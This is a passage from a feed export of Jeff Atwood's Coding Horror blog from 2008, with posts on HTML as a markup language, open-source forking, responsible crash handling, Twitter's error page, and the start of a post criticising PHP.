I'm not sure I agree with all of this, but it can make sense in the context of a full-blown Wiki. It's worth considering.
</p>
<p>
After all this research on humane markup languages, much to my chagrin, I've come full circle. <b>I now no longer think humane markup languages make sense for most uses</b>. I agree with the guy at fileformat.info -- <a href="http://www.fileformat.info/news/2005/03/04/humane_text_formats.htm">HTML is generally the better choice</a>:
</p>
<p>
</p>
<ul>
<li>
<b>Simplicity</b>
<p>If the source and destination are the web, why not use the native markup language of the web?
</p>
<p>
</p>
</li>
<li>
<b>Readability</b>
<p>HTML is a bit less readable than the lightweight markup languages, it's true. But basic HTML is not onerous to read, particularly if we hide the repetitive paragraph tags.
</p>
<p>
</p>
</li>
<li>
<b>Security</b>
<p>
With a bit of careful coding, it is possible to whitelist specific HTML tags that you will allow. This way you avoid exposing yourself to risky/vulnerable tags.
</p>
<p>
</p>
</li>
<li>
<b>Conversion</b>
<p>
It's not at all clear that <i>any</i> existing lightweight markup language has critical mass, with the possible exception of Wikipedia's flavor. On the other hand, text parsers and tools will always understand HTML.
</p>
<p>
</p>
</li>
<li>
<b>What people know</b>
<p>
A lot more people know HTML than any given flavor of humane text. If you're a programmer, you damn well <i>better</i> know HTML. For the handful of wiki-like functions we may need, it's possible to add some optional attributes to the HTML tags. And wouldn't that be easier to learn than some weird, pseudo-ASCII derivation of HTML?
</p>
</li>
</ul>
<p>
I do think we'll adopt some of the cleverer functions of Textile and Markdown, insofar as they remove mundane HTML markup scutwork. But in general, <b>I'd much rather rely on a subset of trusty old HTML</b> than expend brain cells trying to <a href="http://hobix.com/textile/quick.html">remember the fake-HTML way</a> to make something bold, or create a hyperlink. HTML isn't perfect, but it's an eminently reasonable humane markup language.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-13T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/is-html-a-humane-markup-language/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Oh Yeah? Fork You! ]]></title>
<link>https://blog.codinghorror.com/oh-yeah-fork-you/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
In <a href="http://www.codinghorror.com/blog/archives/000842.html">Where Are All The Open Source Billionaires?</a> I used this chart as an illustration:
</p>
<p>
<a href="http://kde-files.org/CONTENT/content-files/44218-linuxdistrotimeline-7.2.png"><img alt="image placeholder" >
</p>
<p>
Because open source code is freely distributable, anyone can take that code and create their own unique mutant mashup version of it any time they feel like it. Whether anyone else in the world will <i>care</i> about their crazy new version of the code is not at all clear, but that's not the point. If someone wants it bad enough, they can create it -- or pay someone else to create it for them. This is known as <a href="http://en.wikipedia.org/wiki/Fork_(software_development)">"forking"</a>. It's the very embodiment of <a href="http://www.codinghorror.com/blog/archives/001044.html">freedom zero</a>, and it's an essential part of <a href="http://www.codinghorror.com/blog/archives/000833.html">every open source license</a>.
</p>
<p>
But there are forks, and <a href="http://www.dwheeler.com/oss_fs_why.html#forking">there are <i>forks</i></a>:
</p>
<p>
</p>
<blockquote>
What is different about a fork is <i>intent</i>. In a fork, the person(s) creating the fork <b>intend for the fork to replace or compete with the original project they are forking.</b>
</blockquote>
<p>
That's <a href="http://www.productbeautiful.com/2008/05/02/why-product-management-is-open-sources-fatal-flaw/">exactly what happened to the Pidgin project</a> recently.
</p>
<p>
</p>
<blockquote>
In their 2.4 release they changed the GUI action of the text field where the user types their IM from a manually re-sizable window, to a fixed size window that auto-re-sizes based on the amount of text typed. On the surface, this sounds like a minor change, but it triggered a massive user revolt! Why?
</blockquote>
<p>
This is what they're up in arms about:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
The developers, for whatever reason, dug in their heels on this one and refused to budge. You can read through some of the commentary <a href="http://developer.Pidgin.im/ticket/4986">on the bug ticket</a> to get an idea, but the general tenor was combatative bordering on hostile. The bug was eventually closed as "won't fix".
</p>
<p>
The community's response was swift: Oh yeah? <a href="http://funPidgin.sourceforge.net/">Fork you!</a>
</p>
<p>
</p>
<blockquote>
Funpidgin is a fork of the popular open source client Pidgin which allows instant messaging with over twenty different protocols.
<p>
What makes us different from the official client is that <b>we work for you</b>. Unlike the Pidgin developers, we believe the user should have the final say in what goes into the program.
</p>
<p>
So far five new features have been added to Funpidgin upon requests from users, and all of them are optional. It is these options that make the use of Funpidgin enjoyable to a diverse range of people.
</p>
</blockquote>
<p>
Funpidgin is a fork in the truest sense; the developers intend to <i>replace</i> Pidgin. But will it? Who knows. There are four possible outcomes from any fork:
</p>
<p>
</p>
<ol>
<li>
<b>The fork dies</b><br>Funpidgin languishes due to lack of attention from developers and users. Funpidgin eventually dies.
</li>
<li>
<b>The fork merges</b><br>Funpidgin and Pidgin reach a consensus. The Funpidgin changes are folded back into Pidgin.
</li>
<li>
<b>The original dies</b><br>Funpidgin becomes so popular that it draws developers and users away from Pidgin. Pidgin eventually dies.
</li>
<li>
<b>Both original and fork survive</b><br>Funpidgin and Pidgin both succeed on their own terms, perhaps by attracting different audiences or meeting different user needs.
</li>
</ol>
<p>
You can find <a href="http://www.dwheeler.com/oss_fs_why.html#forking">examples of all four outcomes</a> peppered throughout the history of open source software. You might think that the adoption of open source software licenses would lead to dozens if not hundreds of incompatible, slightly-different versions of the same stuff -- bewildering users and developers alike. I'm not so sure. There's a <a href="http://linuxmafia.com/faq/Licensing_and_Law/forking.html">tremendous amount of inertia</a> around the open source projects that survive long enough to become popular. Consider the challenges the newly forked Funpidgin project now faces:
</p>
<p>
</p>
<ul>
<li>A divided community of users and developers.
</li>
<li>Siphoning enough energy and attention away from an established project to remain viable.
</li>
<li>Differentiating themselves enough from Pidgin so that they aren't viewed as useless or irrelevant.
</li>
<li>The original Pidgin project is free to take whatever parts of the Funpidgin open source code they deem appropriate and fold that into Pidgin, thus undermining the fork.
</li>
</ul>
<p>
<b>Forking is incredibly difficult to pull off</b>. It is a painful, but necessary part of the evolution of open source software. Just as in real evolution, I suspect that most forks die in vast, nameless numbers, before they become strong enough to engender any forked progeny of their own. Forking is the absolute bedrock of open source software -- but it is also not a path to be chosen lightly.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-15T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/oh-yeah-fork-you/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Crash Responsibly ]]></title>
<link>https://blog.codinghorror.com/crash-responsibly/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
As programmers, it is our responsibility to <b>ensure that when something goes horribly wrong with our software, the user has a reasonable escape plan</b>. It's an issue of fundamental safety in software error handling that I liken to those ubiquitous airline safety cards.
</p>
<p>
<img alt="image placeholder" >
 
<img alt="image placeholder" >
</p>
<p>
Which one accurately depicts the way <i>your</i> software treats the user in the event of an emergency?
</p>
<p>
If I've learned anything in the last thirty years, it's that <a href="http://www.codinghorror.com/blog/archives/000099.html">I write shitty software -- with bugs</a>. I not only need to protect my users from my errors, I need to protect <i>myself</i> from my errors, too. That's why <b>the first thing I do on any new project is set up an error handling framework</b>.  Errors are inevitable, but ignorance shouldn't be. If you know about the problems, you can fix them and respond to them.
</p>
<p>
Note that when I say "errors", I don't mean mundane, workaday problems like empty form values, no results, or file not found. Those kinds of errors are covered quite well in 37 Signals' <a href="http://www.amazon.com/exec/obidos/ASIN/073571410X/codihorr-20">Defensive Design for the Web: How to Improve Error Messages, Help, Forms, and Other Crisis Points</a>.
</p>
<p>
<a href="http://www.amazon.com/exec/obidos/ASIN/073571410X/codihorr-20"><img alt="image placeholder" >
</p>
<p>
It's a great book; a quick read with lots of visual do's and don'ts side by side. Despite the giant exclamation point icon on the cover, however, it's mostly about fundamental web usability, not error handling per se.
</p>
<p>
I'm talking about <b>catastrophic errors -- real disasters</b>. Cases where a previously unknown bug in your code causes the application to crash and burn in spectacular fashion. It happens in all applications, whether they're websites or traditional executables.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
The situation is pretty dire at this point, but some disaster recovery is possible, if you plan ahead.
</p>
<p>
</p>
<ol>
<li>
<b>It is not the user's job to tell you about errors in your software!</b>
<p>
If users have to tell you when your app crashes, and why, you have <i>utterly failed your users</i>. I cannot emphasize this enough.
</p>
<p>
It's bad enough that the user has to use our crashy software; are we really going to add insult to injury by pressing them into service as QA staff, too? If you're relying on users to tell you about problems with your software, you'll only see a tiny fraction of the overall errors. Most users won't bother telling you about problems. They'll just quietly stop using your application.
</p>
<p>
Whatever error handling solution you choose, it should automatically log everything necessary to troubleshoot the crash -- and ideally send a complete set of diagnostic information back to your server. This is fundamental. If you don't have something like this in place yet, do so immediately.
</p>
<p>
</p>
</li>
<li>
<b>Don't expose users to the default <a href="http://en.wikipedia.org/wiki/Screens_of_death">screen of death</a>.</b>
<p>
It's true that we can't do much to recover from these kinds of crashes, but relying on the underlying operating system or webserver to deliver the generic bad news to the user is rude and thoughtless. Override the default crash screen and provide something customized, something relevant to <i>your</i> application and <i>your</i> users. Here are a few ideas:
</p>
<ul>
<li>Let users know that it's our fault, not theirs.
</li>
<li>Inform the user that the error was logged and dispatched.
</li>
<li>If possible, suggest some workarounds and troubleshooting options.
</li>
<li>Perhaps even provide direct contact information if they're really stuck and desperately need to get something done.
</li>
</ul>
</li>
<p>
</p>
<li>
<b>Have a detailed public record of your application's errors.</b>
<p>
In my experience, nothing motivates a team better than a detailed public record of all crashes. There should of course be a searchable, sortable database of errors somewhere, but active notifications are also a good idea. Crashes are <i>incredibly</i> annoying to your users. It's only fair that the team behind the software share a little of that pain for each crash. You could broadcast an error email, text message, or instant message to everyone on the team. Or maybe have every crash automatically open a bug ticket in your bug tracking software. Tired of dealing with all those error emails and/or bug tickets? Fix the software so you don't have to!
</p>
<p>
</p>
</li>
<li>
<b>Leverage the 80/20 rule.</b>
<p>
Once you have a comprehensive record of every crash, you can sort that data by frequency and spend your coding effort resolving the most common problems. Microsoft, <a href="http://www.microsoft.com/whdc/maintain/WERHelp.mspx">based on data from their Windows Error Reporting Service</a>, found that <font color="red">fixing 20 percent of the top reported bugs solved 80 percent of customer issues</font>, and fixing 1 percent of the top reported bugs solved 50 percent of customer issues. That's huge! Let the <a href="http://en.wikipedia.org/wiki/Pareto_principle">Pareto principle</a> work for you, not against you.
</p>
</li>
</ol>
<p>
As software professionals, we should protect our users -- and ourselves -- from our mistakes. <b>Crash responsibly!</b>
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-18T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/crash-responsibly/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Twitter: How Not To Crash Responsibly ]]></title>
<link>https://blog.codinghorror.com/twitter-how-not-to-crash-responsibly/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
In yesterday's post on <a href="http://www.codinghorror.com/blog/archives/001118.html">Crashing Responsibly</a>, I outlined a few ways to improve your application's crash behavior. In the event that your application crashes -- and oh, it will -- why not turn that crash into something that:
</p>
<p>
</p>
<ul>
<li>Records lots of diagnostic information <b>developers</b> can use to improve the application over time.
</li>
<li>Reassures <b>users</b> and provides them with helpful information.
</li>
</ul>
<p>
With that in mind, let's take a look at the <a href="http://twitter.com/">Twitter</a> crash page. How does it serve developers and users?
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I don't mean to pick on Twitter; their bouts of downtime are near legendary at this point. Frankly, it's been <a href="http://www.codinghorror.com/blog/archives/000838.html">discussed to death</a>.
</p>
<p>
It's unfortunate, because I love Twitter. Like Michael Lopp, I'm <a href="http://www.randsinrepose.com/archives/2008/05/15/we_travel_in_tribes.html">dangerously close to being a Twitter fanboy</a>.
</p>
<p>
</p>
<blockquote>
The answer comes down to value. In the time that I've been using Twitter, it's transformed from a curiosity to an essential service. What were seemingly random status updates have now become organized into organic conversational threads that bring a steady flow of relevant content across my desktop.
</blockquote>
<p>
An "essential service" is exactly the kind of thing you <i>don't</i> want to see error pages on. So, then, how does the Twitter error page fare?
</p>
<p>
Not so badly at first glance. It's an attractive error page, styled to match Twitter, with some basic links and navigational elements. Let's be generous and assume that the notification and logging of errors behind the scenes is taken care of. The Twitter developers must have access to a voluminous set of error logs by now.
</p>
<p>
But Twitter's error page is <b>conspicuously lacking any real <i>information</i></b>. As an enthusiastic Twitter user presented with this error page, I am anything but reassured. Instead, I have some nagging questions:
</p>
<p>
</p>
<ul>
<li>Is this an ephemeral, temporary error or some kind of scheduled downtime? How do I tell the difference?
</li>
<li>If this is scheduled downtime, when will it be over? Can I view the maintenance schedule, or the current status of the maintenance work?
</li>
<li>Is Twitter <a href="http://downforeveryoneorjustme.com/">down for everyone, or just me</a>? Is there a place I can go to check Twitter's current system health?
</li>
<li>Twitter has a reputation for unreliability. Where can I find out about Twitter's ongoing efforts to improve their reliability?
</li>
</ul>
<p>
There's absolutely no mention of <i>any</i> of these things on the error page, the exact place I would care the most. Clicking through to the blog provides no relief, no mention of any availability work or maintenance schedules.
</p>
<p>
Furthermore, it's difficult to take the glib claim that "we're going to fix it up and have things back to normal soon" seriously. I've seen so much of the Twitter error page in the last year that I've lost confidence that these errors mean anything to anyone -- or that they're even recorded. This is the static error page that <a href="http://en.wikipedia.org/wiki/The_Boy_Who_Cried_Wolf">cried wolf</a>. Where's the improvement over time from the collection and analysis of these errors?
</p>
<p>
I understand that Twitter has scaling problems I can only dream of. I don't envy the amount of work they'll have to undertake to fix this pernicious, systemic problem of massive scale.
</p>
<p>
But <b>I sure wish they could be a lot more transparent about it</b>.
</p>
<p>
Isn't that what <a href="http://www.codinghorror.com/blog/archives/001118.html">crashing responsibly</a> is all about -- establishing an honest, open dialog between users and developers, even at the worst possible moment of that relationship?
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-19T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/twitter-how-not-to-crash-responsibly/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ PHP Sucks, But It Doesn't Matter ]]></title>
<link>https://blog.codinghorror.com/php-sucks-but-it-doesnt-matter/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>Here's a list of every function beginning with the letter "A" in the <a href="http://www.php.net/manual/en/indexes.php">PHP function index</a>:</p>
<table style="font-family: monospace;">
<tbody>
<tr>
<td valign="top">
<a class="function" href="http://www.php.net/manual/en/function.abs.php">abs()</a><br> <a class="function" href="http://www.php.net/manual/en/function.acos.php">acos()</a><br> <a class="function" href="http://www.php.net/manual/en/function.acosh.php">acosh()</a><br> <a class="function" href="http://www.php.net/manual/en/function.addcslashes.php">addcslashes()</a><br> <a class="function" href="http://www.php.net/manual/en/function.addslashes.php">addslashes()</a><br> <a class="function" href="http://www.php.net/manual/en/function.aggregate.php">aggregate()</a><br> <a class="function" href="http://www.php.net/manual/en/function.aggregate-info.php">aggregate_info()</a><br> <a class="function" href="http://www.php.net/manual/en/function.aggregate-methods.php">aggregate_methods()</a><br> <a class="function" href="http://www.php.net/manual/en/function.aggregate-methods-by-list.php">aggregate_methods_by_list()</a><br> <a class="function" href="http://www.php.net/manual/en/function.aggregate-methods-by-regexp.php">aggregate_methods_by_regexp()</a><br> <a class="function" href="http://www.php.net/manual/en/function.aggregate-properties.php">aggregate_properties()</a><br> <a class="function" href="http://www.php.net/manual/en/function.aggregate-properties-by-list.php">aggregate_properties_by_list()</a><br> <a class="function" href="http://www.php.net/manual/en/function.aggregate-properties-by-regexp.php">aggregate_properties_by_regexp()</a><br> <a class="function" href="http://www.php.net/manual/en/function.aggregation-info.php">aggregation_info()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apache-child-terminate.php">apache_child_terminate()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apache-get-modules.php">apache_get_modules()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apache-get-version.php">apache_get_version()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apache-getenv.php">apache_getenv()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apache-lookup-uri.php">apache_lookup_uri()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apache-note.php">apache_note()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apache-request-headers.php">apache_request_headers()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apache-reset-timeout.php">apache_reset_timeout()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apache-response-headers.php">apache_response_headers()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apache-setenv.php">apache_setenv()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apc-add.php">apc_add()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apc-cache-info.php">apc_cache_info()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apc-clear-cache.php">apc_clear_cache()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apc-compile-file.php">apc_compile_file()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apc-define-constants.php">apc_define_constants()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apc-delete.php">apc_delete()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apc-fetch.php">apc_fetch()</a><br>
</td>
<td valign="top">
<a class="function" href="http://www.php.net/manual/en/function.apc-load-constants.php">apc_load_constants()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apc-sma-info.php">apc_sma_info()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apc-store.php">apc_store()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apd-breakpoint.php">apd_breakpoint()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apd-callstack.php">apd_callstack()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apd-clunk.php">apd_clunk()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apd-continue.php">apd_continue()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apd-croak.php">apd_croak()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apd-dump-function-table.php">apd_dump_function_table()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apd-dump-persistent-resources.php">apd_dump_persistent_resources()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apd-dump-regular-resources.php">apd_dump_regular_resources()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apd-echo.php">apd_echo()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apd-get-active-symbols.php">apd_get_active_symbols()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apd-set-pprof-trace.php">apd_set_pprof_trace()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apd-set-session.php">apd_set_session()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apd-set-session-trace.php">apd_set_session_trace()</a><br> <a class="function" href="http://www.php.net/manual/en/function.apd-set-socket-session-trace.php">apd_set_socket_session_trace()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array.php">array()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-change-key-case.php">array_change_key_case()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-chunk.php">array_chunk()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-combine.php">array_combine()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-count-values.php">array_count_values()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-diff.php">array_diff()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-diff-assoc.php">array_diff_assoc()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-diff-key.php">array_diff_key()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-diff-uassoc.php">array_diff_uassoc()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-diff-ukey.php">array_diff_ukey()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-fill.php">array_fill()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-fill-keys.php">array_fill_keys()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-filter.php">array_filter()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-flip.php">array_flip()</a><br>
</td>
<td valign="top">
<a class="function" href="http://www.php.net/manual/en/function.array-intersect.php">array_intersect()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-intersect-assoc.php">array_intersect_assoc()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-intersect-key.php">array_intersect_key()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-intersect-uassoc.php">array_intersect_uassoc()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-intersect-ukey.php">array_intersect_ukey()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-key-exists.php">array_key_exists()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-keys.php">array_keys()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-map.php">array_map()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-merge.php">array_merge()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-merge-recursive.php">array_merge_recursive()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-multisort.php">array_multisort()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-pad.php">array_pad()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-pop.php">array_pop()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-product.php">array_product()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-push.php">array_push()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-rand.php">array_rand()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-reduce.php">array_reduce()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-reverse.php">array_reverse()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-search.php">array_search()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-shift.php">array_shift()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-slice.php">array_slice()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-splice.php">array_splice()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-sum.php">array_sum()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-udiff.php">array_udiff()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-udiff-assoc.php">array_udiff_assoc()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-udiff-uassoc.php">array_udiff_uassoc()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-uintersect.php">array_uintersect()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-uintersect-assoc.php">array_uintersect_assoc()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-uintersect-uassoc.php">array_uintersect_uassoc()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-unique.php">array_unique()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-unshift.php">array_unshift()</a><br>
</td>
<td valign="top">
<a class="function" href="http://www.php.net/manual/en/function.array-values.php">array_values()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-walk.php">array_walk()</a><br> <a class="function" href="http://www.php.net/manual/en/function.array-walk-recursive.php">array_walk_recursive()</a><br> <a class="function" href="http://www.php.net/manual/en/arrayiterator.current.php">ArrayIterator::current()</a><br> <a class="function" href="http://www.php.net/manual/en/arrayiterator.key.php">ArrayIterator::key()</a><br> <a class="function" href="http://www.php.net/manual/en/arrayiterator.next.php">ArrayIterator::next()</a><br> <a class="function" href="http://www.php.net/manual/en/arrayiterator.rewind.php">ArrayIterator::rewind()</a><br> <a class="function" href="http://www.php.net/manual/en/arrayiterator.seek.php">ArrayIterator::seek()</a><br> <a class="function" href="http://www.php.net/manual/en/arrayiterator.valid.php">ArrayIterator::valid()</a><br> <a class="function" href="http://www.php.net/manual/en/arrayobject.construct.php">ArrayObject::__construct()</a><br> <a class="function" href="http://www.php.net/manual/en/arrayobject.append.php">ArrayObject::append()</a><br> <a class="function" href="http://www.php.net/manual/en/arrayobject.count.php">ArrayObject::count()</a><br> <a class="function" href="http://www.php.net/manual/en/arrayobject.getiterator.php">ArrayObject::getIterator()</a><br> <a class="function" href="http://www.php.net/manual/en/arrayobject.offsetexists.php">ArrayObject::offsetExists()</a><br> <a class="function" href="http://www.php.net/manual/en/arrayobject.offsetget.php">ArrayObject::offsetGet()</a><br> <a class="function" href="http://www.php.net/manual/en/arrayobject.offsetset.php">ArrayObject::offsetSet()</a><br> <a class="function" href="http://www.php.net/manual/en/arrayobject.offsetunset.php">ArrayObject::offsetUnset()</a><br> <a class="function" href="http://www.php.net/manual/en/function.arsort.php">arsort()</a><br> <a class="function" href="http://www.php.net/manual/en/function.ascii2ebcdic.php">ascii2ebcdic()</a><br> <a class="function" href="http://www.php.net/manual/en/function.asin.php">asin()</a><br> <a class="function" href="http://www.php.net/manual/en/function.asinh.php">asinh()</a><br> <a class="function" href="http://www.php.net/manual/en/function.asort.php">asort()</a><br> <strong>aspell_check()</strong><br> <strong>aspell_check_raw()</strong><br> <strong>aspell_new()</strong><br> <strong>aspell_suggest()</strong><br> <a class="function" href="http://www.php.net/manual/en/function.assert.php">assert()</a><br> <a class="function" href="http://www.php.net/manual/en/function.assert-options.php">assert_options()</a><br> <a class="function" href="http://www.php.net/manual/en/function.atan.php">atan()</a><br> <a class="function" href="http://www.php.net/manual/en/function.atan2.php">atan2()</a><br> <a class="function" href="http://www.php.net/manual/en/function.atanh.php">atanh()</a><br>
</td>
</tr>
</tbody>
</table>
<p>I remember my first experience with <a href="http://en.wikipedia.org/wiki/PHP">PHP</a> way back in 2001. Despite my questionable pedigree in ASP and Visual Basic, browsing an alphabetical PHP function list was enough to scare me away for years. Somehow, perusing the above list, I don't think things have improved a whole lot since then.</p>
<p>I'm no language elitist, but <strong>language design is hard</strong>. There's a reason that some of the most famous computer scientists in the world are also language designers. And it's a crying shame none of them ever had the opportunity to work on PHP. From what I've seen of it, <strong>PHP isn't so much a <em>language</em> as a random collection of arbitrary stuff, a virtual explosion at the <a href="http://www.php.net/manual/en/reserved.php">keyword</a> and <a href="http://www.php.net/manual/en/indexes.php">function</a> factory.</strong> Bear in mind this is coming from a guy who was <a href="http://www.codinghorror.com/blog/archives/001104.html">weaned on BASIC</a>, a language that gets about as much respect as <a href="http://en.wikipedia.org/wiki/Rodney_Dangerfield">Rodney Dangerfield</a>. So I am not unfamiliar with the genre.</p>
<p>Of course, this is old news. How old? Ancient. Internet Explorer 4 old. The internet is overrun with <a href="http://www.google.com/search?q=php+sucks">PHP sucks</a> articles – I practically ran out of browser tabs opening them all. Tim Bray bravely bucked this trend and went with the title <a href="http://www.tbray.org/ongoing/When/200x/2006/02/17/PHP">On PHP</a> for his entry in the long-running series:</p>
<blockquote>So here's my problem, based on my limited experience with PHP (deploying a couple of free apps to do this and that, and debugging a site for a non-technical friend here and there): all the PHP code I've seen in that experience has been messy, unmaintainable crap. Spaghetti SQL wrapped in spaghetti PHP wrapped in spaghetti HTML, replicated in slightly-varying form in dozens of places.</blockquote>
<p>Tim's article is as good a place to start as any; he captured a flock of related links in the ensuing discussion. As you read, you'll find there's an obvious parallel between the amateurish state of PHP development and Visual Basic 6, a comparison that many developers have independently arrived at.</p>
<p><a href="http://loveandtheft.org/2008/05/20/php-is-the-new-vb6-in-a-c-dress/">Fredrik Holmstrm</a>:</p>
<blockquote>Every solution I've ever seen or developed in PHP feels clunky and bulky, there is no elegance or grace. Working with PHP is a bit like throwing a 10 pound concrete cube from a ten story building: You'll get where you're going fast, but it's not very elegant. ... I love PHP, and it's the right tool for some jobs. It's just an ugly, cumbersome tool that makes me cry and have nightmares. It's the new VB6 in a C dress.</blockquote>
<p><a href="http://codebetter.com/blogs/karlseguin/archive/2006/11/26/Is-PHP-the-new-VB6_3F00_.aspx">Karl Seguin</a></p>
<blockquote>From my own experience, and the countless of online tutorials and blogs, many PHP developers are guilty of the same crap code VB developers were once renowned for. OO, N-Tier, exception handling, domain modeling, refactoring and unit testing are all foreign concepts in the PHP world.</blockquote>
<p>Understand that as a long time VB developer, I am completely sympathetic to the derision you'll suffer when programming in a wildly popular programming language that isn't considered "professional".</p>
<p><a href="http://www.tiobe.com/index.php/content/paperinfo/tpci/index.html"><img alt="image placeholder" >
<p>I've written both VB and PHP code, and in my opinion <strong>the comparison is grossly unfair to Visual Basic</strong>. Does PHP suck? Of <em>course</em> it sucks. Did you read <em>any</em> of the links in <a href="http://www.tbray.org/ongoing/When/200x/2006/02/17/PHP">Tim's blog entry</a>? It's a galactic supernova of incomprehensibly colossal, <a href="http://maurus.net/resources/programming-languages/php/">mind</a>-<a href="http://www.ukuug.org/events/linux2002/papers/html/php/">bendingly</a> <a href="http://www.bitstorm.org/edwin/en/php/">awful</a> <a href="http://www.tnx.nl/php">suck</a>. If you sit down to program in PHP and have even an ounce of programming talent in your entire body, there's no possible way to draw any other conclusion. It's inescapable.</p>
<p>But I'm also here to tell you <strong>that doesn't matter</strong>.</p>
